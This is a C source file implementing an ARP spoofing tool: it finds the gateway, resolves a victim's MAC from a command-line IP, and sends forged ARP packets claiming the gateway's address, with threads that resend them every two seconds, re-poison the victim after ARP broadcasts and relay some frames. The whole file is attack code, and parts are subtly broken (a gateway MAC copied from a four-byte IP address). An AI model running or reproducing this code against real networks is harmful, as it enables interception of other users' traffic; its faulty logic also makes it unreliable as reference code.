#include <libnet.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <net/route.h>
#include <net/if.h>           // struct ifreq
#include <sys/types.h>        // needed for socket(), uint8_t, uint16_t
#include <sys/socket.h>       // needed for socket()
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include <netinet/ip.h>
#include <errno.h>            // errno, perror()
#include <pthread.h>
#define ARPOP_REPLY 2         // Taken from <linux/if_arp.h>

uint8_t gateway_mac[6];
typedef struct parameter Parameter;
struct parameter {
  int sd;
  uint8_t *ether_frame;
  int frame_length;
  struct sockaddr_ll device;
};

typedef struct _arp_hdr arp_hdr;
struct _arp_hdr {
  uint16_t htype;
  uint16_t ptype;
  uint8_t hlen;
  uint8_t plen;
  uint16_t opcode;
  uint8_t sender_mac[6];
  uint8_t sender_ip[4];
  uint8_t target_mac[6];
  uint8_t target_ip[4];
};
Parameter spoof_P;
void *send_packet(void *P) {
  int bytes;
  Parameter p;
  p = *(Parameter *)P;
  while (1) {
    // Send ethernet frame to socket.
    // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)

    if ((bytes = sendto(p.sd, p.ether_frame, p.frame_length, 0, (struct sockaddr *) &(p.device), sizeof(p.device))) <= 0) {
      perror("sendto() failed");
      exit(EXIT_FAILURE);
    }
    printf("[+]SEND SPOOFING PACKET  1\n");
    //close(p.sd);
    sleep(2);
  }
}


void *send_spoofing(Parameter p){
  int bytes;
  if ((bytes = sendto(p.sd, p.ether_frame, p.frame_length, 0, (struct sockaddr *) &(p.device), sizeof(p.device))) <= 0) {
      perror("sendto() failed");
      exit(EXIT_FAILURE);
  }
  printf("[+]SEND SPOOFING PACKET  2\n");
}

void *relay_packet(void *pk){
  arp_hdr PK;
  arp_hdr *arphdr_rcv;
  uint8_t *ether_frame;
  uint8_t broadcast_mac[6];
  struct sockaddr_ll device;
  PK = *((arp_hdr *)pk);
  int bytes, sd, err;

  memset(broadcast_mac, 0xff, 6 * sizeof(uint8_t));
  ether_frame = (uint8_t *)malloc(IP_MAXPACKET * sizeof(uint8_t));
  memset(ether_frame, 0, IP_MAXPACKET * sizeof(uint8_t));
  memset(&device, 0, sizeof(device));
  if ((device.sll_ifindex = if_nametoindex("ens33") ) == 0) {
    perror("if_nametoindex() failed to obtain interface index ");
    exit(EXIT_FAILURE);
  }
  device.sll_family = AF_PACKET;
  device.sll_halen = 6;
  device.sll_protocol  = htons(ETH_P_ARP);
  printf("relay function start\n");



  while(1){
    if ((sd =socket( AF_PACKET , SOCK_RAW , htons(ETH_P_ALL))) < 0) {
      perror("socket() failed ");
      exit(EXIT_FAILURE);
    }

    if( (err = bind(sd, (struct sockaddr *)&device, sizeof(device))) == -1)
    {
        perror("bind(): ");
        exit(-1);
    }
    printf("relay function start 111\n");
    if ((recv(sd, ether_frame, IP_MAXPACKET, 0)) > 0) {
      /*
      if (errno == EINTR) {
        memset(ether_frame, 0, IP_MAXPACKET * sizeof(uint8_t));
        perror("recv error\n");
        continue;
      }
      */
      printf("relay function 1\n");

      arphdr_rcv = (arp_hdr *)(ether_frame + LIBNET_ETH_H);
      printf("relay function 2\n");

      //if broadcast packet , victim's ARP table will be recovered
      if (memcmp(ether_frame, broadcast_mac, 6) == 0 &&  //broadcast mac = 0xFFFFFFFFFFFF
      (memcmp(arphdr_rcv->sender_ip, PK.sender_ip, 4) == 0 || //victim's broadcast
        memcmp(arphdr_rcv->sender_ip, PK.target_ip, 4) == 0    //gateway's broadcast
        )){
        if (memcmp(arphdr_rcv->sender_ip, PK.sender_ip, 4) == 0) printf("[+]VICTIM BROADCAST (ARP table recovered)\n");
        else if (memcmp(arphdr_rcv->sender_ip, PK.target_ip, 4) == 0) printf("[+]GATEWAY BROADCAST (ARP table recovered)\n");

        /*
      arphdr_rcv->sender_mac =  PK.target_mac ; //attacker's mac
      arphdr_rcv->sender_ip  =  PK.target_ip  ; //gateway's ip
      arphdr_rcv->target_mac =  PK.sender_mac ; //victim's mac
      arphdr_rcv->target_ip  =  PK.sender_ip  ; //victim's ip
      */

        // send spoofing packet to victim
        memcpy(device.sll_addr, PK.sender_mac, 6 * sizeof(uint8_t));
        send_spoofing(spoof_P);


      }
       //if spoofed packet , relay
      else if(
        (memcmp(arphdr_rcv->sender_mac, &PK.sender_mac, 6) == 0) &&
        (memcmp(arphdr_rcv->sender_ip, &PK.sender_ip, 4) == 0) &&
        (memcmp(arphdr_rcv->target_mac, &PK.target_mac, 6) == 0) &&
        (memcmp(arphdr_rcv->target_ip, &PK.target_ip, 4) == 0)
        ){

        memcpy(device.sll_addr, arphdr_rcv->sender_mac, 6 * sizeof(uint8_t));

        memcpy(arphdr_rcv->target_mac, gateway_mac ,6);   //change target mac to gateway mac


        if ((bytes = sendto(sd, ether_frame, LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H, 0, (struct sockaddr *) &(device), sizeof(device))) <= 0) {
          perror("sendto() failed at reply");
          exit(EXIT_FAILURE);
        }
        printf("[+]Send relay packet to Gateway\n");


      }


    }
    close(sd);



  }


}




int main(int argc, char* argv[]) {
  libnet_t *l;  /* libnet context */
  char errbuf[LIBNET_ERRBUF_SIZE];
  u_int32_t ip_addr;
  struct libnet_ether_addr *mac_addr;
  l = libnet_init(LIBNET_RAW4, NULL, errbuf);

  uint8_t *dst_mac, *ether_frame;
  int sd, sd2, sd3, frame_length, bytes;
  uint8_t *ether_frame2;
  struct sockaddr_ll device;

  arp_hdr arphdr_send;
  arp_hdr *arphdr_receive;
  ether_frame = (uint8_t *)malloc(IP_MAXPACKET * sizeof(uint8_t));
  ether_frame2 = (uint8_t *)malloc(IP_MAXPACKET * sizeof(uint8_t));
  memset(ether_frame, 0, IP_MAXPACKET * sizeof(uint8_t));
  struct in_addr gw_ip_addr;
  char buff[1024];
  int count = 0;
  pthread_t p_thread[2];
  int thr_id, thr_id2;


  /* get gateway address  */
  FILE *in = popen("route", "r");
  for (int i = 0; i < 3; i++) {
    fgets(buff, sizeof(buff), in);
  }
  while (buff[count] != ' ') count++;
  while (buff[count] == ' ') count++;
  inet_aton(buff + count, &gw_ip_addr);
  printf("\n [+]Gateway IP Adress : %s\n", inet_ntoa(gw_ip_addr));
  memcpy(gateway_mac, &gw_ip_addr, 6*sizeof(uint8_t));

  pclose(in);
  printf("\n [+]PRINT REQUEST_PACKET\n");
  struct in_addr target_ip_addr;
  inet_aton(argv[1], &target_ip_addr);
  printf("target IP Adress : %s\n", inet_ntoa(target_ip_addr));

  ///////////////////// 0.get my attacker's mac , ip ////////////////////////////////

  if (l == NULL) {
    fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
    exit(EXIT_FAILURE);
  }

  /* get ip address  */
  ip_addr = libnet_get_ipaddr4(l);
  if (ip_addr != 0xff)
    printf("Src IP address: %s\n", libnet_addr2name4(ip_addr, \
      LIBNET_DONT_RESOLVE));
  else
    fprintf(stderr, "Couldn't get own IP address: %s\n", \
      libnet_geterror(l));
  /* get mac address  */
  mac_addr = libnet_get_hwaddr(l);
  if (mac_addr != NULL)
    printf("Src MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n", \
      mac_addr->ether_addr_octet[0], \
      mac_addr->ether_addr_octet[1], \
      mac_addr->ether_addr_octet[2], \
      mac_addr->ether_addr_octet[3], \
      mac_addr->ether_addr_octet[4], \
      mac_addr->ether_addr_octet[5]);
  else
    fprintf(stderr, "Couldn't get own MAC address: %s\n", \
      libnet_geterror(l));
  libnet_destroy(l);

  // Submit request for a raw socket descriptor.
  if ((sd2 = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
    perror("socket() failed ");
    exit(EXIT_FAILURE);
  }
  // Listen for incoming ethernet frame from socket sd.
  // We expect an ARP ethernet frame of the form:
  //     MAC (6 bytes) + MAC (6 bytes) + ethernet type (2 bytes)
  //     + ethernet data (ARP header) (28 bytes)
  // Keep at it until we get an ARP reply.
  arphdr_receive = (arp_hdr *)(ether_frame2 + LIBNET_ETH_H);

  /////////////////////// 1. send REQUEST packet  ////////////////////////////

  // ARP header (request)

  // Hardware type (16 bits): 1 for ethernet
  // arp_request_hdr.ar_hrd = htons(ARPHRD_ETHER);
  arphdr_send.htype = htons(ARPHRD_ETHER);

  // Protocol type (16 bits): 2048 for IP
  arphdr_send.ptype = htons(ETHERTYPE_IP);


  // Hardware address length (8 bits): 6 bytes for MAC address
  arphdr_send.hlen = 6;

  // Protocol address length (8 bits): 4 bytes for IPv4 address
  arphdr_send.plen = 4;

  // OpCode: 1 for ARP request
  arphdr_send.opcode = htons(ARPOP_REQUEST);

  // Sender hardware address (48 bits): MAC address
  memcpy(&arphdr_send.sender_mac, mac_addr, 6 * sizeof(uint8_t));

  // Sender protocol address (32 bits)

  memcpy(&arphdr_send.sender_ip, &ip_addr, 4 * sizeof(uint8_t));

  // See getaddrinfo() resolution of src_ip;.

  // Target hardware address (48 bits): zero, since we don't know it yet.
  memset(&arphdr_send.target_mac, 0, 6 * sizeof(uint8_t));

  // Target protocol address (32 bits)
  memcpy(&arphdr_send.target_ip, &target_ip_addr, 4 * sizeof(uint8_t));

  // Fill out ethernet frame header.

  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
  frame_length = LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H;

  // Set destination MAC address: broadcast address
  dst_mac = (uint8_t *)malloc(6 * sizeof(uint8_t));
  memset(dst_mac, 0xff, 6 * sizeof(uint8_t));

  // Destination and Source MAC addresses
  memcpy(ether_frame, dst_mac, 6 * sizeof(uint8_t));
  memcpy(ether_frame + 6, mac_addr->ether_addr_octet, 6 * sizeof(uint8_t));

  // Next is ethernet type code (ETH_P_ARP for ARP).

  ether_frame[12] = ETHERTYPE_ARP / 256;
  ether_frame[13] = ETHERTYPE_ARP % 256;

  // Next is ethernet frame data (ARP header).

  // ARP header
  memcpy(ether_frame + LIBNET_ETH_H, &arphdr_send, LIBNET_ARP_ETH_IP_H * sizeof(uint8_t));
  // Submit request for a raw socket descriptor.
  if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
    perror("socket() failed ");
    exit(EXIT_FAILURE);
  }

  // struct sockaddr_ll device, which will be used as an argument of sendto().
  memset(&device, 0, sizeof(device));
  if ((device.sll_ifindex = if_nametoindex("ens33")) == 0) {
    perror("if_nametoindex() failed to obtain interface index ");
    exit(EXIT_FAILURE);
  }
  // Fill out sockaddr_ll.
  device.sll_family = AF_PACKET;
  memcpy(device.sll_addr, mac_addr, 6 * sizeof(uint8_t));
  device.sll_halen = 6;

  // Send ethernet frame to socket.
  if ((bytes = sendto(sd, ether_frame, frame_length, 0, (struct sockaddr *) &device, sizeof(device))) <= 0) {
    perror("sendto() failed");
    exit(EXIT_FAILURE);
  }

  ///////////////////////////// 2. receive packet  ///////////////////////

  while (((((ether_frame2[12]) << 8) + ether_frame2[13]) != ETH_P_ARP) || (ntohs(arphdr_receive->opcode) != ARPOP_REPLY)) {
    if ((recv(sd2, ether_frame2, IP_MAXPACKET, 0)) < 0) {
      if (errno == EINTR) {
        memset(ether_frame2, 0, IP_MAXPACKET * sizeof(uint8_t));
        continue;
      }
      else {
        perror("recv() failed:");
        exit(EXIT_FAILURE);
      }
    }
  }



  ////////////////// print received packet ///////////////////

  // Print out contents of received ethernet frame.
  printf("\n [+]PRINT REPLY_PACKET");
  printf("\nEthernet frame header:\n");
  printf("Destination MAC (this node): ");
  int i = 0;
  for (i = 0; i < 5; i++) {
    printf("%02x:", ether_frame2[i]);
  }
  printf("%02x\n", ether_frame2[5]);
  printf("Source MAC: ");
  for (i = 0; i < 5; i++) {
    printf("%02x:", ether_frame2[i + 6]);
  }
  printf("%02x\n", ether_frame2[11]);
  // Next is ethernet type code (ETH_P_ARP for ARP).
  printf("Ethernet type code (2054 = ARP): %u\n", ((ether_frame2[12]) << 8) + ether_frame2[13]);
  printf("Ethernet data (ARP header):\n");
  printf("Hardware type (1 = ethernet (10 Mb)): %u\n", ntohs(arphdr_receive->htype));
  printf("Protocol type (2048 for IPv4 addresses): %u\n", ntohs(arphdr_receive->ptype));
  printf("Hardware (MAC) address length (bytes): %u\n", arphdr_receive->hlen);
  printf("Protocol (IPv4) address length (bytes): %u\n", arphdr_receive->plen);
  printf("Opcode (2 = ARP reply): %u\n", ntohs(arphdr_receive->opcode));
  printf("Sender hardware (MAC) address: ");
  for (i = 0; i < 5; i++) {
    printf("%02x:", arphdr_receive->sender_mac[i]);
  }
  printf("%02x\n", arphdr_receive->sender_mac[5]);
  printf("Sender protocol (IPv4) address: %u.%u.%u.%u\n",
    arphdr_receive->sender_ip[0], arphdr_receive->sender_ip[1], arphdr_receive->sender_ip[2], arphdr_receive->sender_ip[3]);
  printf("Target hardware (MAC) address: ");
  for (i = 0; i < 5; i++) {
    printf("%02x:", arphdr_receive->target_mac[i]);
  }
  printf("%02x\n", arphdr_receive->target_mac[5]);
  printf("Target protocol (IPv4) address: %u.%u.%u.%u\n",
    arphdr_receive->target_ip[0], arphdr_receive->target_ip[1], arphdr_receive->target_ip[2], arphdr_receive->target_ip[3]);
  printf("\n");



  ////////////////////// 3.send spoofing packet    /////////////////////////////////////

  arp_hdr arphdr_spoof;
  uint8_t *ether_frame3;
  ether_frame3 = (uint8_t *)malloc(IP_MAXPACKET * sizeof(uint8_t));
  memset(ether_frame3, 0, IP_MAXPACKET * sizeof(uint8_t));


  // ARP header (request)
  // target mac = victim
  // sender mac = attacker
  // target ip = victim
  // sender ip = gateway
  // dst mac = victim mac
  // src mac = attacter mac


  // Hardware type (16 bits): 1 for ethernet
  // arp_request_hdr.ar_hrd = htons(ARPHRD_ETHER);
  arphdr_spoof.htype = htons(ARPHRD_ETHER);

  // Protocol type (16 bits): 2048 for IP
  arphdr_spoof.ptype = htons(ETHERTYPE_IP);


  // Hardware address length (8 bits): 6 bytes for MAC address
  arphdr_spoof.hlen = 6;

  // Protocol address length (8 bits): 4 bytes for IPv4 address
  arphdr_spoof.plen = 4;


  // OpCode: 1 for ARP request
  arphdr_spoof.opcode = htons(ARPOP_REQUEST);

  // Sender hardware address (48 bits): MAC address
  memcpy(&arphdr_spoof.sender_mac, &arphdr_send.sender_mac, 6 * sizeof(uint8_t));

  // Sender protocol address (32 bits) : gateway address
  memcpy(arphdr_spoof.sender_ip, &gw_ip_addr, 4 * sizeof(uint8_t));

  // See getaddrinfo() resolution of src_ip;.

  // Target hardware address (48 bits): victim address
  memcpy(&arphdr_spoof.target_mac, arphdr_receive->sender_mac  , 6 * sizeof(uint8_t) );

  // Target protocol address (32 bits)
  memcpy(&arphdr_spoof.target_ip, &arphdr_send.target_ip, 4 * sizeof(uint8_t));


  // Fill out ethernet frame header.

  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
  frame_length = LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H;

  // Set destination MAC address: broadcast address
  uint8_t *dst_mac_spf;
  dst_mac_spf = (uint8_t *)malloc(6 * sizeof(uint8_t));
  memcpy(dst_mac_spf, arphdr_receive->sender_mac, 6 * sizeof(uint8_t));


  // Destination and Source MAC addresses
  memcpy(ether_frame3, arphdr_receive->sender_mac, 6 * sizeof(uint8_t));
  memcpy(ether_frame3 + 6, arphdr_receive->target_mac, 6 * sizeof(uint8_t));

  // Next is ethernet type code (ETH_P_ARP for ARP).
  // http://www.iana.org/assignments/ethernet-numbers
  ether_frame3[12] = ETHERTYPE_ARP / 256;
  ether_frame3[13] = ETHERTYPE_ARP % 256;

  // Next is ethernet frame data (ARP header).

  // ARP header
  memcpy(ether_frame3 + LIBNET_ETH_H, &arphdr_spoof, LIBNET_ARP_ETH_IP_H * sizeof(uint8_t));
  // Submit request for a raw socket descriptor.
  if ((sd3 = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
    perror("socket() failed ");
    exit(EXIT_FAILURE);
  }

  // Find interface index from interface name and store index in
  // struct sockaddr_ll device, which will be used as an argument of sendto().
  memset(&device, 0, sizeof(device));
  if ((device.sll_ifindex = if_nametoindex("ens33")) == 0) {
    perror("if_nametoindex() failed to obtain interface index ");
    exit(EXIT_FAILURE);
  }
  // Fill out sockaddr_ll.
  device.sll_family = AF_PACKET;
  memcpy(device.sll_addr, mac_addr, 6 * sizeof(uint8_t));
  device.sll_halen = 6;

  printf("\n [+]SEND SPOOFING PACKET  \n");
  char *mac_buff;
  mac_buff = (char *)malloc(17 * sizeof(char));

  //Parameter param;
  spoof_P.sd = sd3;
  spoof_P.ether_frame = ether_frame3;
  spoof_P.frame_length = frame_length;
  spoof_P.device = device;

  arp_hdr pk;
  pk.htype = htons(ARPHRD_ETHER);
  pk.ptype = htons(ETHERTYPE_IP);
  pk.hlen = 6; //6 bytes for MAC address
  pk.plen = 4; //4 bytes for IPv4 address
  pk.opcode=htons(ARPOP_REQUEST);
  memcpy(pk.sender_mac, arphdr_spoof.target_mac, 6 * sizeof(uint8_t));
  memcpy(pk.sender_ip, arphdr_spoof.target_ip, 4 * sizeof(uint8_t));
  memcpy(pk.target_mac, arphdr_spoof.sender_mac, 6 * sizeof(uint8_t));
  memcpy(pk.target_ip, arphdr_spoof.sender_ip, 4 * sizeof(uint8_t));


  thr_id = pthread_create(&p_thread[0], NULL, send_packet, (void *)&spoof_P); //send infected packet
  thr_id2 = pthread_create(&p_thread[1], NULL, relay_packet, (void *)&pk); // relay infected packet

/*
  while (1) {
    // Send ethernet frame to socket.
    // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
    if ((bytes = sendto(sd3, ether_frame3, frame_length, 0, (struct sockaddr *) &device, sizeof(device))) <= 0) {

      perror("sendto() failed");
      exit(EXIT_FAILURE);
    }

    sleep(1);
  } //while end

*/
  pthread_join(p_thread[0],NULL);
  pthread_join(p_thread[1],NULL);
  free(mac_buff);
  free(dst_mac);
  free(ether_frame);
  free(ether_frame2);
  close(sd);
  close(sd2);


  close(sd3);

  return (EXIT_SUCCESS);
}
